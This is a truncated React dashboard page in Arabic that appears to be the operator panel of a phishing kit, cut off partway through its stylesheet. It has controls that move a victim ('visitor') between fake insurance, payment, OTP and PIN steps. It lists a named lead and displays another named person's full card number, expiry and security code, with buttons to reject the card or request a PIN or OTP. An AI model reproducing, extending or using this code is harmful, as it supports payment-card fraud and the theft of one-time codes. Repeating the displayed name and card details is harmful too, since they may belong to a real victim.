"use client"
import { useState } from "react"

export default function DashboardPage() {
  const [sidebarOpen, setSidebarOpen] = useState(true)
  const [activeIndex, setActiveIndex] = useState(0)

  const menuItems = [
    { label: "الرئيسية", icon: "🏠" },
    { label: "بيانات التأمين", icon: "📋" },
    { label: "مقارنة العروض", icon: "📊" },
    { label: "الدفع", icon: "💳" },
    { label: "OTP", icon: "🔑" },
    { label: "PIN", icon: "🔒" },
  ]

  return (
    <div className="dashboard" dir="rtl">
      {/* زر التحويل بالزاوية */}
      <button 
        className="convert-btn"
        onClick={() => setSidebarOpen(!sidebarOpen)}
      >
        تحويل الزائر 📁
      </button>

      {/* السايدبار اليمين */}
      <div className={`sidebar ${sidebarOpen ? 'open' : 'closed'}`}>
        <h2>لوحة التحكم</h2>
        
        <div className="card-menu">
          <div className="menu-title">تحويل الزائر 📁</div>
          {menuItems.map((item, i) => (
            <button
              key={item.label}
              className={`menu-btn ${i === activeIndex ? 'active' : ''}`}
              onClick={() => setActiveIndex(i)}
            >
              <span>{item.icon} {item.label}</span>
              <div className="radio"></div>
            </button>
          ))}
        </div>

        {/* هنا بتحط قائمة الليدز زي الصورة */}
        <div className="leads-list">
          <div className="lead-item">
            <span>محمد سفر محمد ال هاشم</span>
            <div className="lead-actions">
              <button>رسالة</button>
              <button>مكالمة</button>
              <button>PIN</button>
            </div>
          </div>
        </div>
      </div>

      {/* المحتوى الرئيسي اليسار */}
      <div className="main-content">
        <div className="header">
          <h1>بدر العجمي</h1>
          <button className="btn-pdf">تحميل PDF</button>
        </div>

        <div className="card">
          <h3>معلومات البطاقة</h3>
          <div className="credit-card">
            <div className="card-number">4286 7240 0428 6599</div>
            <div className="card-footer">
              <span>BADRALAJAMY</span>
              <span>05/29</span>
              <span>763</span>
            </div>
          </div>
          <div className="card-actions">
            <button className="btn-red">رفض ✕</button>
            <button className="btn-purple">PIN كود</button>
            <button className="btn-blue">OTP رمز</button>
          </div>
        </div>
      </div>

      <style jsx>{`
        .dashboard {
          display: flex;
          min-height: 100vh;
          background: #0a0c10;
          color: #e2e8f0;
          position: relative;
        }
        
        .convert-btn {
          position: fixed;
          top: 20px;
          left: 20px;
          background: #3b82f6;
          color: white;
          border: none;
          padding: 10px 16px;
          border-radius: 8px;
          cursor: pointer;
          font-weight: 600;
          z-index: 100;
        }
        
        .sidebar {
          width: 320px;
          background: #0f1117;
          border-left: 1px solid #1e2433;
          padding: 20px;
          transition: transform 0.3s ease;
          overflow-y: auto;
        }
        
        .sidebar.closed {
          transform: translateX(100%);
        }
        
        .main-content {
          flex: 1;
          padding: 30px;
        }
        
        .card-menu {
          background: #0a0c10;
          border: 1px solid #1e2433;
          border-radius: 12px;
          padding: 12px;
          margin-bottom: 20px;
        }
        
        .menu-btn {
          width: 100%;
          background: #141821;
          border: 1px solid #1e2433;
          border-radius: 10px;
          padding: 12px;
          margin-bottom: 8px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          cursor: pointer;
          color: #e2e8f0;
          font-weight: 600;
          transition: all 140ms ease;
        }
        
        .menu-btn:hover { background: #1a1f2b; }
        .menu-btn.active {
          background: rgba(59, 130, 246, 0.15);
          border: 1px solid #3b82f6;
          color: #3b82f6;
        }
        
        .radio {
          width: 18px;
          height: 18px;
          border: 2px solid #475569;
          border-radius: 50%;
        }
        .menu-btn.active .radio {
          border: 5px solid #3b82f6;
        }
        
        .credit-card {
          background: linear-gradient(135deg, #1e3a8a, #3b82f6);
          border-radius: 16px;
          padding: 24px;
          margin: 20px 0
